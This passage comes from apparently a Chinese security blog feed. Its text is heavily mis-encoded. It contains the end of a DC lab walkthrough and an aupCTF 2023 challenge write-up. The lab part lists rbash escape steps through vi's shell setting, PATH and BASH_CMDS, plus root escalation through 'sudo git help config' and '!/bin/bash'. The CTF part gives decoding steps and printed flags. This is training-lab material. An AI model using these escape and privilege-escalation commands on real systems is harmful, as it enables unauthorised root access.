title="rbashÈÄÉÈÄ∏(ÊèêÊùÉÁöÑ‰∏ÄÁßç)"></a>rbashÈÄÉÈÄ∏(ÊèêÊùÉÁöÑ‰∏ÄÁßç)</h3><p>rbashÔºöÂ∞±ÊòØÂèóÈôêÁöÑbashÔºàbashÔºå‰∏Ä‰∏™ÂëΩ‰ª§Ë°åËß£ÈáäÂô®ÔºåÊé•ÂèóÁî®Êà∑ËæìÂÖ•ÁöÑÊåá‰ª§Âπ∂‰∏îÊâßË°åÁõ∏Â∫îÁöÑÂëΩ‰ª§ÔºâÔºå‰∏Ä‰∫õÂëΩ‰ª§‰∏çËÉΩ‰ΩøÁî®<br>‰ª•‰∏ãÊÉÖÂÜµÊòØ‰∏çÂÖÅËÆ∏rbashÊâßË°åÁöÑ</p><blockquote><p>‰ΩøÁî®ÂëΩ‰ª§cdÊõ¥ÊîπÁõÆÂΩï<br>ËÆæÁΩÆÊàñËÄÖÂèñÊ∂àÁéØÂ¢ÉÂèòÈáèÁöÑËÆæÁΩÆÔºàSHELL, PATH, ENV, or BASH_ENVÔºâ<br>ÊåáÂÆöÂåÖÂê´ÂèÇÊï∞‚Äô&#x2F;‚ÄòÁöÑÊñá‰ª∂Âêç<br>ÊåáÂÆöÂåÖÂê´ÂèÇÊï∞‚Äô - ‚ÄòÁöÑÊñá‰ª∂Âêç<br>‰ΩøÁî®ÈáçÂÆöÂêëËæìÂá∫‚Äô&gt;‚Äô, ‚Äò&gt;&gt;‚Äô, ‚Äò&gt; |‚Äô, ‚Äò&lt;&gt;‚Äô ‚Äò&gt;&amp;‚Äô,‚Äô&amp;&gt;‚Äô</p></blockquote><p>Â§ßËá¥ÁöÑÈôêÂà∂Â¶Ç‰∏ä<br>Âõ†Ê≠§Êú¨Èù∂Âú∫Áî®Âà∞rbashÈÄÉÈÄ∏ÔºåÁî±‰∫éÊµãËØïÂêéÂèëÁé∞viÂëΩ‰ª§ÂèØ‰ª•‰ΩøÁî®ÔºåÂõ†Ê≠§‰ΩøÁî®viËÆæÁΩÆshell„ÄÇ<br>ËøõÂÖ•viÁïåÈù¢</p><blockquote><p>vi</p><p>ÁÑ∂ÂêéÊåâEscÈîÆÔºåËæìÂÖ•<br>:set shell&#x3D;&#x2F;bin&#x2F;bash</p></blockquote><p>ËÆæÁΩÆÂ•ΩshellÂπ∂ÂõûËΩ¶ÔºåÊé•ÁùÄËæìÂÖ• </p><blockquote><p>:shell</p><p>ÂõûËΩ¶ÔºåÂêØÂä®shell<br>‰πãÂêéÈÄÄÂá∫viÁºñËæëÂô®ÔºåÊü•ÁúãÊùÉÈôê„ÄÇÁªìÊûúËøô‰∏™Èù∂Êú∫Ê≤°ÊúâÊàêÂäüÔºåÊ≠£Â∏∏ÊòØÂ∑≤ÁªèÂèØ‰ª•‰∫ÜÔºåÁî±‰∫éËøô‰∏™Èù∂Êú∫ÁöÑÁéØÂ¢ÉÂèòÈáèÁöÑÈóÆÈ¢òÔºåÂú®ËøôÈáåÊàë‰ª¨‰ΩøÁî®ÂëΩ‰ª§Ê∑ªÂä†ÁéØÂ¢ÉÂèòÈáè<br><code>export PATH=$PATH:/bin/</code><br>ËøôÊù°ÂëΩ‰ª§Â∞ÜÊää &#x2F;bin&#x2F; ÁõÆÂΩïÊ∑ªÂä†Âà∞ÂΩìÂâç PATH ÁéØÂ¢ÉÂèòÈáè‰∏≠„ÄÇ<br>ÁéØÂ¢ÉÂèòÈáè PATH ÊåáÂÆö‰∫ÜÊìç‰ΩúÁ≥ªÁªüÂú®Êü•ÊâæÂèØÊâßË°åÊñá‰ª∂Êó∂Ë¶ÅÊêúÁ¥¢ÁöÑÁõÆÂΩïÂàóË°®„ÄÇÈÄöËøáÂ∞Ü‰∏Ä‰∏™ÁõÆÂΩïË∑ØÂæÑÊ∑ªÂä†Âà∞ PATH ‰∏≠Ôºå‰Ω†ÂèØ‰ª•‰ΩøÁ≥ªÁªüÂú®ËØ•ÁõÆÂΩï‰∏≠Êü•ÊâæÂèØÊâßË°åÊñá‰ª∂„ÄÇ<br>ÂÖ∑‰ΩìËÄåË®ÄÔºåexport PATH&#x3D;$PATH:&#x2F;bin&#x2F; ËøôÊù°ÂëΩ‰ª§ÁöÑÂê´‰πâÊòØÔºö<br>$PATH Ë°®Á§∫ÂΩìÂâçÂ∑≤ÁªèËÆæÁΩÆÁöÑ PATH ÂèòÈáèÁöÑÂÄº„ÄÇÂÆÉÂ∞ÜË¢´Â±ïÂºÄ‰∏∫ÂΩìÂâçÁöÑ PATH Ë∑ØÂæÑ„ÄÇ<br>&#x2F;bin&#x2F; ÊòØË¶ÅÊ∑ªÂä†Âà∞ PATH ‰∏≠ÁöÑÁõÆÂΩïË∑ØÂæÑ„ÄÇ<br>ÈÄöËøáÊâßË°åËøô‰∏™ÂëΩ‰ª§Ôºå‰Ω†Â∞ÜÊää &#x2F;bin&#x2F; ÁõÆÂΩïÊ∑ªÂä†Âà∞ÂΩìÂâçÁöÑ PATH ÂèòÈáè‰∏≠Ôºå‰ΩøÂæóÁ≥ªÁªüËÉΩÂ§üÂú® &#x2F;bin&#x2F; ÁõÆÂΩï‰∏≠Êü•ÊâæÂèØÊâßË°åÊñá‰ª∂„ÄÇËøôÊ†∑ÔºåÂú®‰Ω†ÊâßË°åÂëΩ‰ª§Êó∂ÔºåÁ≥ªÁªüÂ∞Ü‰ºöÂú®ÂéüÊúâÁöÑ PATH Ë∑ØÂæÑ‰∏≠ÊêúÁ¥¢ÂëΩ‰ª§ÔºåÂêåÊó∂‰πü‰ºöÂú® &#x2F;bin&#x2F; ÁõÆÂΩï‰∏≠ÊêúÁ¥¢ÂëΩ‰ª§„ÄÇ<br>ËøôÁßçÊñπÂºèÂèØ‰ª•Êñπ‰æøÂú∞ÊâßË°å‰Ωç‰∫é &#x2F;bin&#x2F; ÁõÆÂΩï‰∏ãÁöÑÂëΩ‰ª§ÔºåËÄåÊó†ÈúÄÊåáÂÆöÂÆåÊï¥ÁöÑË∑ØÂæÑ„ÄÇÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåÂú®‰ΩøÁî® export ÂëΩ‰ª§ËÆæÁΩÆÁéØÂ¢ÉÂèòÈáèÊó∂ÔºåÂè™‰ºöÂú®ÂΩìÂâç‰ºöËØù‰∏≠ÁîüÊïà„ÄÇÂ¶ÇÊûúÂ∏åÊúõÂú®ÊØèÊ¨°ÁôªÂΩïÊó∂Ëá™Âä®ËÆæÁΩÆ PATHÔºåÂèØ‰ª•Â∞ÜËØ•ÂëΩ‰ª§Ê∑ªÂä†Âà∞ÂêØÂä®Êñá‰ª∂ÔºàÂ¶Ç .bashrc Êàñ .bash_profileÔºâ‰∏≠„ÄÇ</p></blockquote><p><code>export PATH=$PATH:/usr/bin/</code></p><blockquote><p>ËøôÊù°ÂëΩ‰ª§Â∞ÜÊää &#x2F;usr&#x2F;bin&#x2F; ÁõÆÂΩïÊ∑ªÂä†Âà∞ÂΩìÂâç PATH ÁéØÂ¢ÉÂèòÈáè‰∏≠„ÄÇ<br>ÁéØÂ¢ÉÂèòÈáè PATH ÊåáÂÆö‰∫ÜÊìç‰ΩúÁ≥ªÁªüÂú®Êü•ÊâæÂèØÊâßË°åÊñá‰ª∂Êó∂Ë¶ÅÊêúÁ¥¢ÁöÑÁõÆÂΩïÂàóË°®„ÄÇÈÄöËøáÂ∞Ü‰∏Ä‰∏™ÁõÆÂΩïË∑ØÂæÑÊ∑ªÂä†Âà∞ PATH ‰∏≠Ôºå‰Ω†ÂèØ‰ª•‰ΩøÁ≥ªÁªüÂú®ËØ•ÁõÆÂΩï‰∏≠Êü•ÊâæÂèØÊâßË°åÊñá‰ª∂„ÄÇ<br>ÂÖ∑‰ΩìËÄåË®ÄÔºåexport PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin&#x2F; ËøôÊù°ÂëΩ‰ª§ÁöÑÂê´‰πâÊòØÔºö<br>$PATH Ë°®Á§∫ÂΩìÂâçÂ∑≤ÁªèËÆæÁΩÆÁöÑ PATH ÂèòÈáèÁöÑÂÄº„ÄÇÂÆÉÂ∞ÜË¢´Â±ïÂºÄ‰∏∫ÂΩìÂâçÁöÑ PATH Ë∑ØÂæÑ„ÄÇ<br>&#x2F;usr&#x2F;bin&#x2F; ÊòØË¶ÅÊ∑ªÂä†Âà∞ PATH ‰∏≠ÁöÑÁõÆÂΩïË∑ØÂæÑ„ÄÇ<br>ÈÄöËøáÊâßË°åËøô‰∏™ÂëΩ‰ª§Ôºå‰Ω†Â∞ÜÊää &#x2F;usr&#x2F;bin&#x2F; ÁõÆÂΩïÊ∑ªÂä†Âà∞ÂΩìÂâçÁöÑ PATH ÂèòÈáè‰∏≠Ôºå‰ΩøÂæóÁ≥ªÁªüËÉΩÂ§üÂú® &#x2F;usr&#x2F;bin&#x2F; ÁõÆÂΩï‰∏≠Êü•ÊâæÂèØÊâßË°åÊñá‰ª∂„ÄÇËøôÊ†∑ÔºåÂú®‰Ω†ÊâßË°åÂëΩ‰ª§Êó∂ÔºåÁ≥ªÁªüÂ∞Ü‰ºöÂú®ÂéüÊúâÁöÑ PATH Ë∑ØÂæÑ‰∏≠ÊêúÁ¥¢ÂëΩ‰ª§ÔºåÂêåÊó∂‰πü‰ºöÂú® &#x2F;usr&#x2F;bin&#x2F; ÁõÆÂΩï‰∏≠ÊêúÁ¥¢ÂëΩ‰ª§„ÄÇ<br>ËøôÁßçÊñπÂºèÂèØ‰ª•Êñπ‰æøÂú∞ÊâßË°å‰Ωç‰∫é &#x2F;usr&#x2F;bin&#x2F; ÁõÆÂΩï‰∏ãÁöÑÂëΩ‰ª§ÔºåËÄåÊó†ÈúÄÊåáÂÆöÂÆåÊï¥ÁöÑË∑ØÂæÑ„ÄÇÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåÂú®‰ΩøÁî® export ÂëΩ‰ª§ËÆæÁΩÆÁéØÂ¢ÉÂèòÈáèÊó∂ÔºåÂè™‰ºöÂú®ÂΩìÂâç‰ºöËØù‰∏≠ÁîüÊïà„ÄÇÂ¶ÇÊûúÂ∏åÊúõÂú®ÊØèÊ¨°ÁôªÂΩïÊó∂Ëá™Âä®ËÆæÁΩÆ PATHÔºåÂèØ‰ª•Â∞ÜËØ•ÂëΩ‰ª§Ê∑ªÂä†Âà∞ÂêØÂä®Êñá‰ª∂ÔºàÂ¶Ç .bashrc Êàñ .bash_profileÔºâ‰∏≠„ÄÇ</p></blockquote><h3 id="BASH-CMDSËÆæÁΩÆshell"><a href="#BASH-CMDSËÆæÁΩÆshell" class="headerlink" title="BASH_CMDSËÆæÁΩÆshell"></a>BASH_CMDSËÆæÁΩÆshell</h3><p>BASH_CMDS ÊòØ‰∏Ä‰∏™ÂåÖÂê´ Bash ÂëΩ‰ª§ÁöÑÂÖ≥ËÅîÊï∞ÁªÑÔºàassociative arrayÔºâÁéØÂ¢ÉÂèòÈáè„ÄÇÂÆÉÂú® Bash ‰∏≠Áî®‰∫éÂ≠òÂÇ®ÂíåÁÆ°ÁêÜÂëΩ‰ª§ÁöÑÂÆö‰πâÂíåÂà´Âêç„ÄÇÂΩì‰Ω†Âú® Bash ‰∏≠ÂÆö‰πâ‰∏Ä‰∏™ÂáΩÊï∞„ÄÅÂà´ÂêçÊàñÂÖ≥ÈîÆÂ≠óÊó∂ÔºåÂÆÉ‰ºöË¢´Ê∑ªÂä†Âà∞ BASH_CMDS ÁéØÂ¢ÉÂèòÈáè‰∏≠„ÄÇBASH_CMDS ÊòØ‰∏Ä‰∏™ÂÖ≥ËÅîÊï∞ÁªÑÔºåÂÆÉ‰ª•ÂëΩ‰ª§Âêç‰Ωú‰∏∫Á¥¢ÂºïÔºåÂØπÂ∫îÁöÑÂÄºÂàôÊòØÂëΩ‰ª§ÁöÑÂÆö‰πâ„ÄÇ</p><p><code>BASH_CMDS[x]=/bin/bash</code>Ëøô‰∏™ÂëΩ‰ª§ÊòØÂú®BASH_CMDSÊï∞ÁªÑ‰∏≠Â∞ÜÁ¥¢ÂºïxÂÖ≥ËÅîÂà∞&#x2F;bin&#x2F;bashÁöÑÂëΩ‰ª§ÔºåÊÑèÊÄùÂ∞±ÊòØÊâßË°å<strong>a</strong>ÂëΩ‰ª§Êó∂‰πüÂ∞±ÊòØÊâßË°å‰∫Ü**&#x2F;bin&#x2F;bash**ÂëΩ‰ª§„ÄÇ<br>‰∏é‰∏äÈù¢‰∏§Êù°ÂëΩ‰ª§ÈÖçÂêà‰πãÂêéÂ∞±ÂèØ‰ª•ÂÆûÁé∞rbashÈÄÉÈÄ∏„ÄÇ(ÂèØ‰ª•ÊâßË°åË¢´ÈôêÂà∂ÁöÑÂëΩ‰ª§‰∫Ü)<br><img src="https://img-blog.csdnimg.cn/f1b84162e4bd44f3af7d24217ca12ca0.png" alt="2"></p><h3 id="gitÊèêÊùÉ"><a href="#gitÊèêÊùÉ" class="headerlink" title="gitÊèêÊùÉ"></a>gitÊèêÊùÉ</h3><p>ÂâçÈù¢ÂÆûÁé∞<strong>rbashÈÄÉÈÄ∏</strong>ÂêéÊâìÂºÄflagÊñá‰ª∂ÊèêÁ§∫jerryÁî®Êà∑ÔºåÊàë‰ª¨ÂàáÊç¢Âà∞jerryÁî®Êà∑ÔºàÂØÜÁ†ÅÂ∞±ÊòØ‰πãÂâçÁàÜÁ†¥Âá∫Êù•ÁöÑÂØÜÁ†ÅÔºâÔºåÊâìÂºÄjerryÁî®Êà∑‰∏ãÁöÑflagÂæóÂà∞ÊèêÁ§∫ÈúÄË¶ÅgitÊèêÊùÉ„ÄÇ<br>gitÊèêÊùÉÁöÑÂâçÊèêÊòØÂú®‰ΩøÁî®ÂëΩ‰ª§<code>sudo -l</code>‰πãÂêéÊ≤°ÊúâÂØÜÁ†ÅÈ™åËØÅ„ÄÇ<br><img src="https://img-blog.csdnimg.cn/151e0426bdce4e17b9045110b9e3dc0d.png" alt="1"><br><strong>Á¨¨‰∏ÄÁßç</strong></p><blockquote><p>sudo git help config</p></blockquote><p>ÂõûËΩ¶ÁÑ∂ÂêéËæìÂÖ•</p><blockquote><p>!&#x2F;bin&#x2F;bash  (ËøôÈáåbash‰πüÂèØ‰ª•Êç¢Êàêsh)</p></blockquote><p><strong>Á¨¨‰∫åÁßç</strong></p><blockquote><p>sudo git -p help</p></blockquote><p>ÂõûËΩ¶ËæìÂÖ•</p><blockquote><p>!&#x2F;bin&#x2F;bash  (ËøôÈáåbash‰πüÂèØ‰ª•Êç¢Êàêsh)</p></blockquote><p>Â∑≤ÁªèÊàê‰∏∫rootÊùÉÈôê</p><h2 id="ÂëΩ‰ª§Â≠¶‰π†"><a href="#ÂëΩ‰ª§Â≠¶‰π†" class="headerlink" title="ÂëΩ‰ª§Â≠¶‰π†"></a>ÂëΩ‰ª§Â≠¶‰π†</h2><p>ÁéØÂ¢ÉÂèòÈáèÊü•ÁúãÔºàÊü•ÁúãÂèØÊâßË°åÂëΩ‰ª§Ôºâ</p><blockquote><p>echo $PATH<br>ÊØîÂ¶ÇËØ¥ÂæóÂà∞**&#x2F;home&#x2F;jerry&#x2F;bin**ÔºåÂêéÈù¢‰ΩøÁî®<code>echo /home/jerry/bin/*</code>Êü•ÁúãÂèØÊâßË°åÁöÑÂëΩ‰ª§</p></blockquote><p>Ê∑ªÂä†ÁéØÂ¢ÉÂèòÈáè</p><blockquote><p>export PATH&#x3D;$PATH:Ë∑ØÂæÑ<br>Â∏∏Áî®Ë∑ØÂæÑÂèòÈáè&#x2F;usr&#x2F;binÂíå&#x2F;bin&#x2F;</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Èù∂Âú∫ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>aupCTF 2023</title>
      <link href="/2023/06/26/aupCTF-2023/"/>
      <url>/2023/06/26/aupCTF-2023/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Ancient-Cipher"><a href="#Ancient-Cipher" class="headerlink" title="Ancient Cipher"></a>Ancient Cipher</h3><p><img src="https://img-blog.csdnimg.cn/5df595f659f94c7ab5d801f037dc2a2d.png" alt="1"><br>ÂÖàÊîæÈöèÊ≥¢ÈÄêÊµÅÈáåÁúãÁúãÔºåÂæóÂà∞flagÔºåÊòØÂáØÊíí‰ΩçÁßª17‰Ωç<br><img src="https://img-blog.csdnimg.cn/ba3e1de862294304a5b0ef7baddfaf6b.png" alt="2"></p><h3 id="Enigma"><a href="#Enigma" class="headerlink" title="Enigma"></a>Enigma</h3><p><img src="https://img-blog.csdnimg.cn/0f0569b9766b44a786367768f6b9e46e.png" alt="3"><br>Ëøô‰∏™ÂØÜÁ†ÅÁ¨¨‰∏ÄÊ¨°ËßÅÔºåÊü•‰∫Ü‰∏Ä‰∏ãÊòØÊÅ©Â∞ºÊ†ºÁ†ÅÊú∫Ôºå‰ΩøÁî®ÁΩëÁ´ô<a href="https://www.dcode.fr/chiffre-machine-enigma">dcode.fr</a>Ëß£ÂØÜ<br><img src="https://img-blog.csdnimg.cn/e8e5f10487bf4d5b9c058283305c173b.png" alt="3">ÂæóÂà∞flag„ÄÇ</p><h3 id="Swiss-Army-Knife"><a href="#Swiss-Army-Knife" class="headerlink" title="Swiss Army Knife"></a>Swiss Army Knife</h3><p>ÁÇπÂºÄÊñá‰ª∂ÂêéÊòØÁî±XYÁªÑÊàêÁöÑÂ≠óÁ¨¶<br><img src="https://img-blog.csdnimg.cn/5c8faeb486e642c7bb99a4da46ec88f0.png" alt="1">ËøôËÆ©ÊàëÊÉ≥Âà∞‰∫Ü‰∫åËøõÂà∂0Âíå1„ÄÇÂ∞ÜXÊõøÊç¢‰∏∫0ÔºåYÊõøÊç¢‰∏∫1<br><code>01001100 01010011 00110000 01110100 01001001 01000011 00110100 01110100 01001100 01101001 01000001 01110100 01001100 01101001 00110100 01110100 01001001 01000011 00110000 01110100 01001100 01101001 01000001 01110101 01001100 01101001 00110100 01100111 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110101 01001100 01101001 00110100 01100111 01001100 01010011 00110100 01100111 01001100 01101001 00110000 01110101 01001100 01101001 01000001 01110101 01001100 01101001 00110000 01110101 01001001 01000011 00110100 01110101 01001100 01101001 00110100 01110101 01001001 01000011 00110100 01110100 01001100 01010011 01000001 01110100 01001100 01010011 01000001 01110101 01001100 01101001 00110100 01110100 01001100 01010011 01000001 01110101 01001100 01010011 00110100 01100111 01001100 01101001 00110000 01110101 01001001 01000011 00110000 01110101 01001001 01000011 00110100 01110101 01001100 01101001 00110000 01100111 01001100 01101001 00110000 01110101 01001001 01000011 00110000 01110100 01001100 01101001 01000001 01110101 01001100 01101001 00110100 01100111 01001100 01010011 00110000 01100111 01001100 01101001 00110000 01110100 01001100 01010011 01000001 01110100 01001001 01000011 00110100 01110101 01001100 01010011 00110100 01100111 01001100 01101001 00110100 01110100 01001001 01000011 00110000 01110100 01001100 01101001 00110100 01100111 01001100 01101001 00110000 01110100 01001001 01000011 00110000 01110100 01001100 01010011 01000001 01110101 01001100 01101001 00110100 01110101 01001100 01101001 01000001 01110101 01001100 01010011 00110100 01100111 01001100 01010011 00110000 01110101 01001100 01010011 01000001 01110100 01001100 01010011 00110000 01100111 01001100 01101001 00110100 01110101 01001100 01101001 00110000 01100111 01001100 01010011 00110100 01110100 01001100 01010011 01000001 01110101 01001100 01010011 00110000 01100111 01001100 01010011 00110000 01110100 01001001 01000011 00110000 01110101 01001100 01101001 00110100 01110101 01001001 01000011 00110100 01110100 01001100 01101001 01000001 01110101 01001100 01101001 00110100 01110100 01001001 01000011 00110100 01110101 01001100 01010011 00110100 01100111 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110100 01001001 01000011 00110000 01110101 01001100 01101001 01000001 01110100 01001100 01101001 00110000 01100111 01001100 01010011 00110000 01100111 01001100 01101001 00110100 01110101 01001100 01010011 00110000 01100111 01001100 01010011 00110100 01110101 01001100 01010011 01000001 01110101 01001100 01010011 00110000 01110101 01001001 01000011 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010001 00111101 00111101</code><br>ÁÑ∂Âêé‰∫åËøõÂà∂ËΩ¨asciiÁ†Å<br><img src="https://img-blog.csdnimg.cn/5cd8d3aaff6c474eb06754a05281c615.png" alt="1">ÂæóÂà∞base64ÁºñÁ†ÅÁöÑÂØÜÊñáÔºåÂÜçËøõË°åËß£ÂØÜÂæóÂà∞Êë©ÊñØÂØÜÁ†Å<br><img src="https://img-blog.csdnimg.cn/59f1604b00e046fab59fc63703de08cb.png" alt="1">Âú®ËøõË°åÊë©ÊñØÂØÜÁ†ÅËß£ÂØÜÂêéÂèàÂæóÂà∞baseÁ≥ªÂàóÁöÑÂØÜÊñá<br><img src="https://img-blog.csdnimg.cn/9840a4da1a1b450482459d1139feb27e.png" alt="2">ÁªßÁª≠Ëß£ÂØÜ<br><img src="https://img-blog.csdnimg.cn/8ea27925a3a54fb6b5b99e177b2351c9.png" alt="1">ÊúÄÂêéÂÜçËøõË°å‰∏ÄÊ¨°ÂáØÊííËß£ÂØÜÔºåkey&#x3D;19ÔºåÂæóÂà∞flag„ÄÇ<strong>aupCTF{mu1tip13-3nc0d1ng5-u53d}</strong></p><h3 id="Battista‚Äôs-Bet"><a href="#Battista‚Äôs-Bet" class="headerlink" title="Battista‚Äôs Bet"></a>Battista‚Äôs Bet</h3><p><strong>ÊàëÁöÑÊúãÂèãÊòØÊÑèÂ§ßÂà©ËëóÂêçÂØÜÁ†ÅÂ≠¶ÂÆ∂Giovan Battista BellasoÁöÑÂø†ÂÆûÁ≤â‰∏ùÔºå‰ªñÂêëÊàëÊåëÊàòÁ†¥Ëß£Ëøô‰∏™ÂØÜÊñá„ÄÇÊàë‰∏ÄÁõ¥Âú®Âä™ÂäõËß£Á†ÅÂÆÉÔºå‰Ω†ËÉΩÂ∏ÆÊàëÂêó **<br>Êü•ÊâæËøô‰∏™ÂØÜÁ†ÅÂ≠¶ÂÆ∂ÂèëÊòéÁöÑÂØÜÁ†Å<br><img src="https://img-blog.csdnimg.cn/9edf442d5cd04e6bb10dbff65252c89d.png" alt="1">ÊâìÂºÄ<a href="https://www.dcode.fr/chiffre-autoclave">ÁΩëÁ´ô</a>Ëß£ÂØÜ<br>ËøôÈáåÈúÄË¶Å‰∏Ä‰∏™ÂØÜÈí•ÔºåÊü•ÁúãÊèêÁ§∫ÂèëÁé∞ÂØÜÈí•‰∏∫</strong>SECRET**<br><img src="https://img-blog.csdnimg.cn/d4ffb92d6b4c42fd9b8a0579ca441991.png" alt="2">ÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/9b847c749a684ba4a8d84d6f6d5ca062.png" alt="2"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Starter"><a href="#Starter" class="headerlink" title="Starter"></a>Starter</h3><p>ÊâìÂºÄÁΩëÁ´ôÂêéÂ¶Ç‰∏ãÁïåÈù¢<br><img src="https://img-blog.csdnimg.cn/d2498d0fc13b422cb81eec69d0c87a2f.png" alt="6">Êü•ÁúãÊ∫êÁ†ÅÂæóÂà∞flag„ÄÇ<strong>aupCTF{w45n‚Äôt-th47-h4rd-r1gh7}</strong><br><img src="https://img-blog.csdnimg.cn/2af8c9822abb47fda91d26bd8b464b41.png" alt="7"></p><h3 id="SQLi-1"><a href="#SQLi-1" class="headerlink" title="SQLi - 1"></a>SQLi - 1</h3><p><img src="https://img-blog.csdnimg.cn/12c88ff0993c4feaaaa5b118f669d684.png" alt="7">ÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/e3d70cf1983240e3b7bc7e5b007b3329.png" alt="2"></p><h3 id="SQLi-2"><a href="#SQLi-2" class="headerlink" title="SQLi - 2"></a>SQLi - 2</h3><p>ÊñπÊ≥ïÂêåSQLi - 1</p><h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>ÁªôÂá∫Ê∫êÁ†Å</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">headar_easy</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>META<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'HTTP_GETFLAG'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'yes'</span><span class="token punctuation">:</span>        context <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'flag'</span><span class="token punctuation">:</span> <span class="token string">'[REDACTED]'</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>                <span class="token keyword">return</span> render<span class="token punctuation">(</span>request<span class="token punctuation">,</span> <span class="token string">'aa/flag.html'</span><span class="token punctuation">,</span> context<span class="token punctuation">)</span>        <span class="token keyword">return</span> render<span class="token punctuation">(</span>request<span class="token punctuation">,</span> <span class="token string">'aa/index.html'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÊÑèÊÄùÂ∞±ÊòØÂ¶ÇÊûúheaderÂ§¥ÈáåÊúâGETFLAGÔºåÂπ∂‰∏îÂÄº‰∏∫yesÂç≥ÂèØÂæóÂá∫flag„ÄÇ<strong>aupCTF{cust0m-he4d3r-r3qu3st}</strong><br><img src="https://img-blog.csdnimg.cn/fb98935d0ddd4199911500d3d259d82c.png" alt="1"></p><h3 id="Directory"><a href="#Directory" class="headerlink" title="Directory"></a>Directory</h3><p><img src="https://img-blog.csdnimg.cn/0f027c28c6fe4a7eb1179daeaa99dbf0.png" alt="2"><br>ÊâìÂºÄÁΩëÁ´ôÂêé<br><img src="https://img-blog.csdnimg.cn/453d33679d7c4d86969f177b9a73147d.png" alt="3">Èöè‰æøÁÇπËøõ‰∏Ä‰∏™ÁúãÁúã<br><img src="https://img-blog.csdnimg.cn/6cdfe7300f214c7a8003a3312c65f3c2.png" alt="2"><br>È¢òÁõÆÊÑèÊÄùÂ∞±ÊòØÁàÜÁ†¥pageÔºåÊûú‰∏çÂÖ∂ÁÑ∂ÔºåÂèëÁé∞712‰∏∫flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/552adc4ecd794ed982cb5681c503668d.png" alt="3"></p><h2 id="Stegnography"><a href="#Stegnography" class="headerlink" title="Stegnography"></a>Stegnography</h2><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>ÁúãÈ¢òÁõÆÂ∞±Áü•ÈÅìÊòØLSBÈöêÂÜô„ÄÇ<br><img src="https://img-blog.csdnimg.cn/2253e5d2e4b74e7fb2dd531267e47149.png" alt="6"><br>ÊãøÂà∞flagÔºö<strong>aupCTF{zst1g-1s-c00l_rig3ht}</strong></p><h3 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h3><p>ÁªôÂá∫‰∏§‰∏™Ê®°Á≥äÂõæÁâáÔºåËøõË°åÂºÇÊàñÂ§ÑÁêÜ„ÄÇ<br>‰ΩøÁî®Â∑•ÂÖ∑<strong>Stegsolve.jar</strong><br>ÂÖàÈÄâÊã©‰∏ÄÂº†ÂõæÁâáÔºåÁÑ∂ÂêéÂú®‰∏éÂè¶‰∏ÄÂº†ÂõæÁâáÁªìÂêà<br><img src="https://img-blog.csdnimg.cn/5d3f882cc578437d83836eff62d22738.png" alt="1"><br>‰πãÂêéÂæóÂà∞ÂõæÁâá<br><img src="https://img-blog.csdnimg.cn/3dc9c71a6ece4deba4cd1dd49a996a8f.png" alt="2"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Fun"><a href="#Fun" class="headerlink" title="Fun"></a>Fun</h3><p>JSFUCKËß£ÂØÜ<br><img src="https://img-blog.csdnimg.cn/38a4f300723c41f48d5f83d2564b51cc.png" alt="1"><br>ÊîæÊéßÂà∂Âè∞ÈáåËøêË°åÂ∞±ÂèØ‰ª•ÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/a31ef56efa794b0ab298c69e29f3ff6b.png" alt="1"><br><strong>aupCTF{j4v45c1pt_but_f*ck3d}</strong></p><h3 id="Sanity-check"><a href="#Sanity-check" class="headerlink" title="Sanity check"></a>Sanity check</h3><p><img src="https://img-blog.csdnimg.cn/f5113653227342e7b872c62864e5621d.png" alt="1">Â∞±ÊòØ‰∏ÄÈÅìÁ≠æÂà∞È¢òÔºåflagÂú®ËßÑÂàôÈáåËØ¥Êòé‰∫Ü<br><img src="https://img-blog.csdnimg.cn/e26f24dd654b4460a14a9e1dcea4e2a5.png" alt="2"></p><h3 id="Frequency"><a href="#Frequency" class="headerlink" title="Frequency"></a>Frequency</h3><p><img src="https://img-blog.csdnimg.cn/cce4e02a75d24f24a43a7ac3a6ac9cfc.png" alt="1">‰∏ãËΩΩÈü≥È¢ëÊñá‰ª∂ÂêéÂê¨Âà∞ÊåâÈîÆÁöÑÂ£∞Èü≥ÔºåÁúãÊù•ÊòØ<strong>DTMFÊã®Âè∑Èü≥ËØÜÂà´</strong>Êúâ‰∏Ä‰∏™Á±ª‰ººÁöÑÈ¢ò<a 